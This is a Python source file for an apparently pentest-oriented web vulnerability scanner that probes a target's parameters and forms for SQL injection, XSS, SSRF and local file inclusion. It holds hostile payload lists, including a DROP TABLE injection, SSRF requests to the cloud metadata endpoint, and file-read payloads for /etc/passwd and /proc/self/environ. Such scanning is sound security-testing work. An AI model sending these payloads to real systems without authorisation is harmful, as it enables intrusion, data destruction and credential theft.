"""Web vulnerability scanner - SQLi, XSS, SSRF, LFI detection."""
import asyncio
import httpx
import re
import urllib.parse
from typing import Dict, Any, Optional, List, Tuple
from ..base import BaseTool
from ..models import ToolResult, ToolStatus
from ...safety.models import Target


# SQL Injection payloads
SQLI_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "\" OR 1=1--",
    "1' AND '1'='1", "1 AND 1=1", "' UNION SELECT NULL--", "1; DROP TABLE users--",
    "admin'--", "' OR ''='", "1' ORDER BY 1--", "1' ORDER BY 100--",
]

# SQL error patterns
SQLI_ERRORS = [
    r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySqlException",
    r"valid MySQL result", r"PostgreSQL.*ERROR", r"Warning.*pg_",
    r"ORA-\d{5}", r"Oracle error", r"SQLite.*error", r"sqlite3.OperationalError",
    r"Microsoft.*ODBC.*SQL Server", r"SQLSTATE\[", r"Unclosed quotation mark",
    r"quoted string not properly terminated", r"syntax error.*SQL",
]

# XSS payloads
XSS_PAYLOADS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>", "javascript:alert(1)", "<body onload=alert(1)>",
    "'><script>alert(1)</script>", "\"><script>alert(1)</script>",
    "<iframe src=\"javascript:alert(1)\">", "<input onfocus=alert(1) autofocus>",
]

# XSS reflection patterns
XSS_PATTERNS = [
    r"<script>alert\(1\)</script>", r"<img src=x onerror=alert\(1\)>",
    r"<svg onload=alert\(1\)>", r"javascript:alert\(1\)",
]

# SSRF payloads
SSRF_PAYLOADS = [
    "http://127.0.0.1", "http://localhost", "http://[::1]",
    "http://169.254.169.254", "http://metadata.google.internal",
    "http://0.0.0.0", "file:///etc/passwd", "dict://localhost:11211",
]

# LFI payloads
LFI_PAYLOADS = [
    "../../../etc/passwd", "....//....//....//etc/passwd",
    "/etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "php://filter/convert.base64-encode/resource=index.php",
    "/proc/self/environ", "..%2f..%2f..%2fetc%2fpasswd",
]

# LFI success patterns
LFI_PATTERNS = [
    r"root:.*:0:0:", r"\[boot loader\]", r"localhost",
    r"127\.0\.0\.1", r"PD9waHA",  # base64 encoded <?php
]


class VulnScanner(BaseTool):
    """Web vulnerability scanner for SQLi, XSS, SSRF, LFI."""

    name = "vuln_scanner"
    description = "Web vulnerability scanner (SQLi, XSS, SSRF, LFI)"
    category = "web"

    def __init__(self, timeout: float = 10.0, max_concurrent: int = 10):
        self.timeout = timeout
        self.max_concurrent = max_concurrent

    async def execute(self, target: Target, params: Optional[Dict] = None) -> ToolResult:
        """Execute vulnerability scan."""
        params = params or {}
        scan_types = params.get("scan_types", ["sqli", "xss", "lfi"])
        test_params = params.get("test_params", ["id", "page", "file", "url", "q", "search", "query"])

        # Normalize URL
        base_url = self._normalize_url(target.value)

        # Run scans
        results = await self._run_scans(base_url, scan_types, test_params)

        # Parse results
        parsed = self._parse_results(base_url, results)

        return ToolResult(
            tool_name=self.name,
            status=ToolStatus.SUCCESS,
            raw_output=str(results),
            parsed_data=parsed,
            execution_time=0.0
        )

    def _normalize_url(self, url: str) -> str:
        """Normalize URL."""
        if not url.startswith(("http://", "https://")):
            url = f"https://{url}"
        return url.rstrip("/")

    async def _run_scans(self, base_url: str, scan_types: List[str], test_params: List[str]) -> Dict[str, List]:
        """Run all vulnerability scans."""
        results = {"sqli": [], "xss": [], "ssrf": [], "lfi": []}

        async with httpx.AsyncClient(timeout=self.timeout, verify=False, follow_redirects=True) as client:
            # First, get the base page to find forms and parameters
            try:
                response = await client.get(base_url)
                forms = self._extract_forms(response.text, base_url)
                params_found = self._extract_params(base_url)
            except:
                forms = []
                params_found = []

            # Test URL parameters
            for param in test_params + params_found:
                test_url = f"{base_url}?{param}=FUZZ"

                if "sqli" in scan_types:
                    vulns = await self._test_sqli(client, test_url, param)
                    results["sqli"].extend(vulns)

                if "xss" in scan_types:
                    vulns = await self._test_xss(client, test_url, param)
                    results["xss"].extend(vulns)

                if "lfi" in scan_types:
                    vulns = await self._test_lfi(client, test_url, param)
                    results["lfi"].extend(vulns)

            # Test forms
            for form in forms[:5]:  # Limit to 5 forms
                if "sqli" in scan_types:
                    vulns = await self._test_form_sqli(client, form)
                    results["sqli"].extend(vulns)

                if "xss" in scan_types:
                    vulns = await self._test_form_xss(client, form)
                    results["xss"].extend(vulns)

        return results

    def _extract_forms(self, html: str, base_url: str) -> List[Dict]:
        """Extract forms from HTML."""
        forms = []
        form_pattern = r'<form[^>]*action=["\']?([^"\'>\s]*)["\']?[^>]*method=["\']?(\w+)["\']?[^>]*>(.*?)</form>'

        for match in re.finditer(form_pattern, html, re.IGNORECASE | re.DOTALL):
            action = match.group(1) or base_url
            method = match.group(2).upper()
            form_html = match.group(3)

            # Extract inputs
            inputs = []
            input_pattern = r'<input[^>]*name=["\']?([^"\'>\s]+)["\']?[^>]*>'
            for input_match in re.finditer(input_pattern, form_html, re.IGNORECASE):
                inputs.append(input_match.group(1))

            if inputs:
                forms.append({
                    "action": urllib.parse.urljoin(base_url, action),
                    "method": method,
                    "inputs": inputs
                })

        return forms

    def _extract_params(self, url: str) -> List[str]:
        """Extract parameters from URL."""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        return list(params.keys())

    async def _test_sqli(self, client: httpx.AsyncClient, test_url: str, param: str) -> List[Dict]:
        """Test for SQL injection."""
        vulns = []

        for payload in SQLI_PAYLOADS[:5]:  # Limit payloads
            url = test_url.replace("FUZZ", urllib.parse.quote(payload))
            try:
                response = await client.get(url)
                text = response.text

                # Check for SQL errors
                for pattern in SQLI_ERRORS:
                    if re.search(pattern, text, re.IGNORECASE):
                        vulns.append({
                            "type": "sqli",
                            "param": param,
                            "payload": payload,
                            "url": url,
                            "evidence": pattern
                        })
                        break
            except:
                pass

        return vulns

    async def _test_xss(self, client: httpx.AsyncClient, test_url: str, param: str) -> List[Dict]:
        """Test for XSS."""
        vulns = []

        for payload in XSS_PAYLOADS[:5]:
            url = test_url.replace("FUZZ", urllib.parse.quote(payload))
            try:
                response = await client.get(url)
                text = response.text

                # Check if payload is reflected
                if payload in text or urllib.parse.unquote(payload) in text:
                    vulns.append({
                        "type": "xss",
                        "param": param,
                        "payload": payload,
                        "url": url,
                        "evidence": "Payload reflected in response"
                    })
                    break
            except:
                pass

        return vulns

    async def _test_lfi(self, client: httpx.AsyncClient, test_url: str, param: str) -> List[Dict]:
        """Test for LFI."""
        vulns = []

        for payload in LFI_PAYLOADS[:5]:
            url = test_url.replace("FUZZ", urllib.parse.quote(payload))
            try:
                response = await client.get(url)
                text = response.text

                # Check for LFI success
                for pattern in LFI_PATTERNS:
                    if re.search(pattern, text):
                        vulns.append({
                            "type": "lfi",
                            "param": param,
                            "payload": payload,
                            "url": url,
                            "evidence": pattern
                        })
                        break
            except:
                pass

        return vulns

    async def _test_form_sqli(self, client: httpx.AsyncClient, form: Dict) -> List[Dict]:
        """Test form for SQL injection."""
        vulns = []

        for input_name in form["inputs"][:3]:
            for payload in SQLI_PAYLOADS[:3]:
                data = {inp: "test" for inp in form["inputs"]}
                data[input_name] = payload

                try:
                    if form["method"] == "POST":
                        response = await client.post(form["action"], data=data)
                    else:
                        response = await client.get(form["action"], params=data)

                    for pattern in SQLI_ERRORS:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            vulns.append({
                                "type": "sqli",
                                "param": input_name,
                                "payload": payload,
                                "url": form["action"],
                                "method": form["method"],
                                "evidence": pattern
                            })
                            break
                except:
                    pass

        return vulns

    async def _test_form_xss(self, client: httpx.AsyncClient, form: Dict) -> List[Dict]:
        """Test form for XSS."""
        vulns = []

        for input_name in form["inputs"][:3]:
            for payload in XSS_PAYLOADS[:3]:
                data = {inp: "test" for inp in form["inputs"]}
                data[input_name] = payload

                try:
                    if form["method"] == "POST":
                        response = await client.post(form["action"], data=data)
                    else:
                        response = await client.get(form["action"], params=data)

                    if payload in response.text:
                        vulns.append({
                            "type": "xss",
                            "param": input_name,
                            "payload": payload,
                            "url": form["action"],
                            "method": form["method"],
                            "evidence": "Payload reflected"
                        })
                        break
                except:
                    pass

        return vulns

    def _parse_results(self, base_url: str, results: Dict[str, List]) -> Dict[str, Any]:
        """Parse scan results."""
        findings = []

        severity_map = {
            "sqli": "high",
            "xss": "high",
            "ssrf": "high",
            "lfi": "high"
        }

        for vuln_type, vulns in results.items():
            for vuln in vulns:
                findings.append({
                    "type": vuln_type,
                    "severity": severity_map.get(vuln_type, "medium"),
                    "param": vuln.get("param", ""),
                    "payload": vuln.get("payload", ""),
                    "url": vuln.get("url", ""),
                    "evidence": vuln.get("evidence", ""),
                    "description": f"{vuln_type.upper()} vulnerability in parameter '{vuln.get('param', '')}'"
                })

        return {
            "base_url": base_url,
            "total_vulnerabilities": len(findings),
            "findings": findings,
            "summary": {
                "sqli": len(results.get("sqli", [])),
                "xss": len(results.get("xss", [])),
                "ssrf": len(results.get("ssrf", [])),
                "lfi": len(results.get("lfi", [])),
            }
        }

    def parse_output(self, raw_output: str) -> Dict[str, Any]:
        return {"raw": raw_output}

    def validate_params(self, params: Dict) -> bool:
        return True
